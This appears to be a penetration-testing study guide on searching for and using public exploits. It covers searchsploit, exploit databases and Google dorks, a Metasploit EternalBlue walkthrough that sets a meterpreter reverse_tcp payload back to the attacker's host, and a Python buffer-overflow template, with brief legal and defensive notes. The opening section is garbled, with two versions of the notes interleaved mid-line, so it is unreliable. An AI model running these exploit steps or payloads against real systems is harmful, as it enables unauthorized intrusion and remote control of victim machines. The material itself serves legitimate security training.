# Public Exploit Research and Utilization## Finding public exploits



Methods and tools for finding, evaluating, and utilizing public exploits during penetration testing engagements.Google: application name + exploit



## OverviewSearchsploit: 



Public exploits are proof-of-concept code or detailed vulnerability information available in public databases. Understanding how to effectively search, evaluate, and utilize these resources is crucial for successful penetration testing while maintaining safety and legal compliance.```shell-session

searchsploit openssh 7.2

## Exploit Discovery Methods```



### Search Engine ResearchOnline databases: [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com/).



| Search Strategy | Example Query | Purpose |## Metasploit

|-----------------|---------------|---------|

| **Service + Version** | `"Apache 2.4.41" exploit` | Target specific versions |```shell-session

| **CVE + Details** | `CVE-2021-44228 exploit log4j` | Find CVE-specific exploits |msfconsole

| **Application + Exploit** | `WordPress 5.8 exploit` | General application research |```

| **Error Messages** | `"exact error message" exploit` | Error-based research |

```shell-session

**Advanced Google Dorking**:msf6 > search exploit eternalblue

``````

site:exploit-db.com "application name"

site:github.com "CVE-2023-XXXXX" exploitUse:

filetype:py "exploit" "vulnerability name"

``````shell-session

msf6 > use exploit/windows/smb/ms17_010_psexec

### Command-Line Tools```



#### SearchsploitShow options

```shell-session

**Installation**: Available in Kali Linux or installable via aptmsf6 > show options

```bash```

# Update exploit databaseAny options set to yes need to be set to work.

searchsploit -uRHOST = target IP

LHOST = attack host IP (IP associated with tun0)

# Basic search```shell-session

searchsploit openssh 7.2msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40

# Search with case sensitivitymsf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0

searchsploit -c "OpenSSH 7.2"LHOST => tun0

```

# Show exploit pathCheck first to see if vulnerable:

searchsploit -p 45233```shell-session

msf6 exploit(windows/smb/ms17_010_psexec) > check

# Copy exploit to current directory```

searchsploit -m 45233Run/exploit:

```shell-session

# Search excluding specific termsmsf6 exploit(windows/smb/ms17_010_psexec) > exploit

searchsploit ssh --exclude="denial"```

```

**Search Operators**:
| Operator | Usage | Example |
|----------|-------|---------|
| **Exact match** | `searchsploit -t "exact title"` | Precise title matching |
| **Multiple terms** | `searchsploit term1 term2` | AND logic |
| **Version range** | `searchsploit "application 2.[0-5]"` | Version patterns |

## Public Exploit Databases

### Primary Databases

| Database | URL | Specialization |
|----------|-----|----------------|
| **Exploit-DB** | https://www.exploit-db.com/ | Comprehensive exploit archive |
| **National Vulnerability Database** | https://nvd.nist.gov/ | Official CVE database |
| **Rapid7 Vulnerability DB** | https://www.rapid7.com/db/ | Metasploit-focused exploits |
| **Vulnerability Lab** | https://www.vulnerability-lab.com/ | Independent research |
| **PacketStorm** | https://packetstormsecurity.com/ | Security tools and exploits |

### Specialized Resources

| Resource | Focus Area | Access Method |
|----------|------------|---------------|
| **MITRE CVE** | CVE assignments | Web interface |
| **CXSecurity** | Daily exploits | RSS/Web |
| **0day.today** | Recent exploits | Subscription |
| **GitHub** | Code repositories | Search/API |

## Metasploit Framework

### Basic Usage

#### Starting Metasploit
```bash
# Initialize database (first time)
msfdb init

# Start console
msfconsole

# Update modules
msfupdate
```

#### Exploit Search and Selection
```bash
# Search for exploits
msf6 > search exploit eternalblue
msf6 > search type:exploit platform:windows smb

# Search with filters
msf6 > search cve:2017 rank:excellent platform:linux

# Use specific exploit
msf6 > use exploit/windows/smb/ms17_010_psexec

# Show exploit information
msf6 exploit(windows/smb/ms17_010_psexec) > info
msf6 exploit(windows/smb/ms17_010_psexec) > show options
msf6 exploit(windows/smb/ms17_010_psexec) > show targets
```

### Configuration and Execution

#### Setting Options
```bash
# Set required options
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0

# Show current options
msf6 exploit(windows/smb/ms17_010_psexec) > show options

# Advanced options
msf6 exploit(windows/smb/ms17_010_psexec) > show advanced
msf6 exploit(windows/smb/ms17_010_psexec) > set VERBOSE true
```

#### Payload Configuration
```bash
# Show available payloads
msf6 exploit(windows/smb/ms17_010_psexec) > show payloads

# Set specific payload
msf6 exploit(windows/smb/ms17_010_psexec) > set payload windows/x64/meterpreter/reverse_tcp

# Configure payload options
msf6 exploit(windows/smb/ms17_010_psexec) > show payload options
```

#### Exploitation Process
```bash
# Check if target is vulnerable
msf6 exploit(windows/smb/ms17_010_psexec) > check

# Run the exploit
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
# or
msf6 exploit(windows/smb/ms17_010_psexec) > run

# Background session
meterpreter > background

# List active sessions
msf6 > sessions -l

# Interact with session
msf6 > sessions -i 1
```

## Exploit Evaluation Process

### Vulnerability Assessment

| Assessment Criteria | Evaluation Method | Risk Level |
|-------------------|------------------|------------|
| **Exploit reliability** | Test success rate | Critical factor |
| **Target compatibility** | OS/version matching | Must verify |
| **Proof of concept vs weaponized** | Code analysis | Safety consideration |
| **Dependencies** | Library/tool requirements | Feasibility check |

### Code Analysis

#### Static Analysis
```bash
# File examination
file exploit.py
strings exploit.py | grep -i "shell\|connect\|exec"

# Python syntax check
python -m py_compile exploit.py

# Ruby syntax check
ruby -c exploit.rb
```

#### Dynamic Analysis
```bash
# Safe execution environment
# Use isolated VM/container
# Monitor network activity
# Check file system changes
```

## Exploit Modification and Customization

### Common Modifications

| Modification Type | Purpose | Implementation |
|------------------|---------|----------------|
| **IP/Port changes** | Target specification | Edit connection parameters |
| **Payload adaptation** | Environment matching | Modify shellcode/commands |
| **Evasion techniques** | AV/IDS bypass | Encoding/obfuscation |
| **Stability improvements** | Reliable exploitation | Error handling |

### Example Modifications

#### Python Exploit Customization
```python
# Original exploit snippet
import socket
target_ip = "192.168.1.100"  # Modify this
target_port = 80             # Modify this

# Payload modification
payload = b"A" * 1024 + b"\x90" * 16 + shellcode  # Customize shellcode

# Add error handling
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(payload)
except Exception as e:
    print(f"Exploit failed: {e}")
```

## Manual Exploit Development

### Buffer Overflow Template
```python
#!/usr/bin/env python3
import socket
import sys

# Target configuration
target_ip = "TARGET_IP"
target_port = TARGET_PORT

# Exploit components
offset = 1024  # EIP offset
ret_addr = b"\x42\x42\x42\x42"  # Return address
nops = b"\x90" * 16  # NOP sled
shellcode = b""  # Payload

# Build exploit
buffer = b"A" * offset + ret_addr + nops + shellcode

# Send exploit
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(buffer)
    s.close()
    print("Exploit sent successfully")
except Exception as e:
    print(f"Error: {e}")
```

## Security Considerations

### Legal and Ethical Guidelines

- Only use exploits on systems you're authorized to test
- Verify exploit safety before execution
- Document all exploitation attempts
- Follow responsible disclosure for new vulnerabilities
- Understand potential collateral damage

### Safety Practices

| Practice | Purpose | Implementation |
|----------|---------|---------------|
| **Isolated testing** | Prevent accidental damage | VM/container usage |
| **Backup verification** | Data protection | Confirm backup availability |
| **Monitoring setup** | Impact assessment | Network/system monitoring |
| **Rollback planning** | Service restoration | Recovery procedures |

### Exploit Validation

| Validation Step | Method | Importance |
|----------------|--------|------------|
| **Source verification** | Check author credentials | Trust assessment |
| **Code review** | Manual analysis | Safety confirmation |
| **Sandbox testing** | Isolated execution | Behavior verification |
| **Hash verification** | File integrity check | Authenticity |

## Defensive Perspectives

### Detection Methods

| Detection Type | Indicators | Tools |
|---------------|------------|-------|
| **Signature-based** | Known exploit patterns | IDS/IPS systems |
| **Behavioral** | Anomalous activity | EDR solutions |
| **Network-based** | Suspicious traffic | Network monitoring |
| **Host-based** | System changes | HIDS tools |

### Prevention Strategies

| Strategy | Implementation | Effectiveness |
|----------|---------------|---------------|
| **Patch management** | Regular updates | High |
| **Network segmentation** | VLAN isolation | Medium-High |
| **Application whitelisting** | Execution control | High |
| **Intrusion prevention** | Real-time blocking | Medium |

## Additional Resources

- [Exploit-DB](https://www.exploit-db.com/) - Comprehensive exploit database
- [National Vulnerability Database](https://nvd.nist.gov/) - Official CVE information
- [Rapid7 Vulnerability Database](https://www.rapid7.com/db/) - Metasploit exploits
- [MITRE CVE](https://cve.mitre.org/) - CVE assignments and details
- [PacketStorm Security](https://packetstormsecurity.com/) - Security tools and exploits